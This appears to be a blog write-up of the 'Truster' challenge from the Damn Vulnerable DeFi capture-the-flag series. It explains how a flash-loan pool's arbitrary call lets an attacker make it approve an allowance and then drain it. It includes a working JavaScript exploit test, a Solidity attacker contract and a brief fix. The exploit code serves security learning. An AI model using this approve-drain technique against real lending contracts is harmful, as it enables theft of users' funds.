@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Truster - lmkalg's blog</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Truster", url: "#_top", children: [
+              {title: "Statement", url: "#statement" },
+              {title: "Analysis", url: "#analysis" },
+              {title: "Final solution", url: "#final-solution" },
+              {title: "Fix", url: "#fix" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../ctfs/hackthebox/registration/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../ctfs/hackthebox/registration/" class="btn btn-xs btn-link">
+        Initial registration to HTB
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../naive_receiver/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../naive_receiver/" class="btn btn-xs btn-link">
+        Naive Receiver
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="truster">Truster</h1>
+<h2 id="statement">Statement</h2>
+<p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
+Currently the pool has 1 million DVT tokens in balance. And you have nothing.
+But don't worry, you might be able to take them all from the pool. In a single transaction.</p>
+<h2 id="analysis">Analysis</h2>
+<p>We need to steal all the DVT from the pool and send them to the attacker's address.</p>
+<h3 id="understanding-contracts">Understanding contracts</h3>
+<p>There is only one contract to analyze:</p>
+<ul>
+<li><strong>TrusterLenderPool.sol</strong>: Contract which implements the logic of lending flash loans.</li>
+</ul>
+<p>It has only one interesting function: </p>
+<ul>
+<li><strong>flashLoan</strong>: Function that implements the lending logic. </li>
+</ul>
+<pre><code class="language-java">1.    function flashLoan(
+2.        uint256 borrowAmount,
+3.        address borrower,
+4.        address target,
+5.        bytes calldata data
+6.    )
+7.        external
+8.        nonReentrant
+9.    {
+10         uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+11.        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);
+12.        
+13.        damnValuableToken.transfer(borrower, borrowAmount);
+14.        target.functionCall(data);
+15.
+16.        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+17.        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn't been paid back&quot;);
+18.    }
+</code></pre>
+<p>Some comments about this function:</p>
+<ol>
+<li>It has the nonReentrant modifier, thus is not possible to attack it with Reentrancy.</li>
+<li>Lines 10 and 11 ensures that the current DVT pool balance is enough to borrow the asked amount. Otherwise it reverts. </li>
+<li>Line 13th lends the borrowed money to the borrower. </li>
+<li>This is quite interesting. It calls a function (which function will depend on the data provided) from the "<strong>target</strong>" Smart Contract. The interesting thing here is that the caller uses both the target value and the data. In simple words, it fully controls the function of which Smart Contract is going to be called.</li>
+<li>Lines 16 and 17 ensure that the borrower paid back the loan. </li>
+</ol>
+<p>So moving directly towards the interesting part: How can an attacker leverage the possibility of this arbitrary call? If we want to extract all the money from the pool, we should somehow be able to "bypass" the last check. Right? ...Sure? Well, not really. That check is actually not bypassable (as to my knowledge). Instead, we should do something that accomplishes the requirements ensured in line 16 and 17, but still allows us to steal the money. </p>
+<p>I loved this challenge because it involved a bit more knowledge about the ERC20 standard. I'm not totally sure this is the real reason, but from my POV, because of how DeFi works (Uniswap/Pancakeswap routers) there was a need to implement some concept that would allow an extra entity to spend your money on your behalf. Despite the fact that, at first it could sound a bit weird, this concept is deeply used and very probably you already made use of it and you didn't know. </p>
+<p>ERC20 standard, allows you to provide <strong>Allowance</strong> to spend your money by another entity. For example, I could state that I want Pancakeswap to have the allowance to spend my $LUNA tokens. This is what usually happens when using the DEX's Router. In order to do so, ERC20 exposes a function call <strong>approve</strong>. This function, receives the <strong>spender</strong> address and the <strong>amount</strong> which this <strong>spender</strong> is able to spend. As a side note, I don't recall the version, but at some point OZ included <strong>increaseAllowance()</strong> and <strong>decreaseAllowance()</strong> functions instead of <strong>approve()</strong> in order to tackle a dangerous race condition. If you wanted to decrease the approved amount to your spender, you could end up giving them even a bigger amount to spend. I think that the <a href="https://forum.openzeppelin.com/t/explain-the-practical-use-of-increaseallowance-and-decreaseallowance-functions-on-erc20/15103">first answer</a> in this forum explains it in a really short and easy way. Anyways, I just mentioned this because I read about it a couple of months ago, but it is not important for the sake of solving this challenge.</p>
+<p>Going back to the allowance concept, what we could do is force the Truster Lender Pool to call the ERC20 (damn vulnerable token) contract and execute the <strong>approve()</strong> function and thus adding our address (or any other address that we want) the power to spend all their tokens. This won't modify the balance of DVT tokens the Trust Lender Pool has, and therefore the checks to ensure that the loan was repaid won't fail. Furthermore, there is no check for asking for a loan of 0 tokens, so we don't have to deal with that problem. In fact, I'm not completely sure about this, but I think this is a KEY part of the solution, because otherwise I'm not sure how we would have managed the part of returning the money. We would have had to do the arbitrary call to some controlled Smart Contract and therefore loose the power of calling a non-controlled one (like the DVT Contract in this case) with the Truster Lender Pool as <strong>msg.sender</strong>.</p>
+<p>Enough with ideas, let's move forward to the solution.. </p>
+<h2 id="final-solution">Final solution</h2>
+<h3 id="raw-solution">Raw Solution</h3>
+<p>My Javascript developing skills are really bad. My Solidity ones too. However, I invested a lot of time during 2021 understanding how ethereum worked, creating bots and blah, and therefore I knew how a transaction should be crafted. The first exploit I crafted to solve this challenge didn't make use of almost any HardHat feature but just got fun playing with bytes: </p>
+<pre><code class="language-javascript">    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE  */
+        function_arity = &quot;approve(address,uint256)&quot;;
+        func_selector = Web3Utils.keccak256(function_arity).slice(0,10);
+        spender = attacker.address.slice(2).padStart(64, '0'); // Remove 0x
+        amount_to_approve = BigInt(TOKENS_IN_POOL).toString(16).padStart(64,'0');
+        data = func_selector + spender + amount_to_approve; 
+
+        // Debug
+        console.log(&quot;Function Selector: &quot; + func_selector);
+        console.log(&quot;Spender: &quot; + spender);
+        console.log(&quot;Amount to approve: &quot; + amount_to_approve);
+        console.log(&quot;Data to send: &quot; + data);
+
+        // Check allowance before 
+        allowance_before = await this.token.allowance(this.pool.address, attacker.address);
+        console.log(&quot;Allowance: &quot; + allowance_before)
+
+
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);
+
+        // Check allowance after
+        allowance_after = await this.token.allowance(this.pool.address, attacker.address);
+        console.log(&quot;Allowance: &quot; + allowance_after)
+
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+
+        });
+</code></pre>
+<p>The <strong>data</strong> object that we need to send is basically the payload that the DVT token Smart Contract will receive. Every time you execute a transaction against a Smart Contract where you call a function, you should provide inside the <strong>input</strong> field, the information of which function you're actually executing. This information is usually encoded. How? First, you must provide the Function Selector (not going to explain this but is simply a way to identify functions inside a Smart Contract). The function select is the first 4 bytes of the keccak256 hash of the function arity. You can find the function arity inside the ABI of the Contract. Following the function selector, all the parameters in hex padded to 64 bytes should be placed. Due to dealing with the <strong>approve()</strong> function that has two parameters (an address: the spender and a uint256: the amount), we needed to "encode" them and add this to our payload. Furthermore, it's important to recall the amount of decimals that the amount must have. This totally depends on the token. Usually it is 18 decimals but in some weird cases I came across tokens with 9 decimals. I could have extracted this from the DVT token contract itself, but it was faster to just hardcode the use of 18 decimals. </p>
+<p>Once we have all that information together, we are ready to go. Just for the sake of clarity I added some logging to see the if the allowance increased after calling the <strong>flashLoan</strong> function. This call will ask for 0 tokens as loan, and will provide the attacker address (future spender), the token address (Smart Contract to be called inside the <strong>functionCall</strong>) and finally the <strong>data</strong> (payload of <strong>approve()</strong> function) that we want to execute. Once this call is finished, nothing will happen in terms of balances (the pool will still have their tokens and the attacker will still have 0 tokens). However, the attacker will be authorized to spend all the money from the Truster Lender Pool. So it's a matter of a executing a <strong>transferFrom</strong> from the attacker wallet, and sending all the funds to its own wallet. </p>
+<h3 id="fancy-and-tidy-solution">Fancy and Tidy solution</h3>
+<p>A fancier, tidier and better solution is just executing the same thing from a Smart Contract. This allows the attacker to just execute one transaction and also to avoid them calculating the function selector, decimals, and blah (things that I like :P). I developed the following Smart Contract (yeah.. my Solidity developing skills also suck)</p>
+<pre><code class="language-java">1.  // SPDX-License-Identifier: MIT
+2.  pragma solidity ^0.8.0;
+3.  import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;
+4.  import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;
+5.
+6.  interface ITrusterLenderPool {
+7.    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external;
+8.    function damnValuableToken() external returns (IERC20);
+9.   }
+10 
+11. contract AttackerTruster is Ownable {
+12.    
+13.    constructor (address pool_address, address attacker_address){
+14.        pool = ITrusterLenderPool(pool_address);
+15.        damn_token = IERC20(pool.damnValuableToken());
+16.
+17.        uint256 tokens_to_steal = damn_token.balanceOf(pool_address);
+18.        bytes memory data = abi.encodeWithSignature(&quot;approve(address,uint256)&quot;, address(this), tokens_to_steal);
+19.
+20         pool.flashLoan(0, address(this), address(damn_token), data);
+21        
+22         bool success = damn_token.transferFrom(pool_address, attacker_address, tokens_to_steal);
+23         require(success, &quot;Something failed while trying to send the tokens to the attacker address&quot;);
+24    } 
+25
+}
+</code></pre>
+<p>In order to develop this solution I read a bit more about how to use the ABI interface, how to cast Interfaces in order to call their functions in a tidy way, etc. </p>
+<p>Lines 14 and 15 just wrap the addresses of the pool and DVT token into their Interfaces objects. The 17 line gets the current DVT balance of the pool address. Line 18th performs all the encoding process explained in the previous chapter (<strong>approve()</strong> payload) (much easier, right? meehhhh). Line 20th executes the call to the <strong>flashLoan()</strong> function, this is where the magic happens. After executing it, this contract will be able to spend all the DVT tokens of the Truster Lender Pool. Finally, line 22 executes the <strong>transferFrom()</strong> function, sending all the money to the attacker's address.</p>
+<p>In order to solve it, I stored the previous Smart Contract inside an "attackers-contracts" directory within the "contracts" directory and completed the following line inside <strong>truster.challenge.js</strong>:</p>
+<pre><code class="language-javascript">it('Exploit', async function () {
+        const AttackerTruster = await ethers.getContractFactory('AttackerTruster', attacker);
+        await AttackerTruster.deploy(this.pool.address, attacker.address);
+    });
+</code></pre>
+<h2 id="fix">Fix</h2>
+<p>As part of my learning phase of Smart Contracts Security, I like to think how I could solve this issue. 
+I would have done two things: </p>
+<ul>
+<li>Check that the borrowed amount is greater than 0. </li>
+<li>I'm not sure if I would lose some kind of feature here, but I would have restricted the call to the msg.sender() and not to a open, independent and arbitrary <strong>target</strong>.</li>
+</ul>
+
+  <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
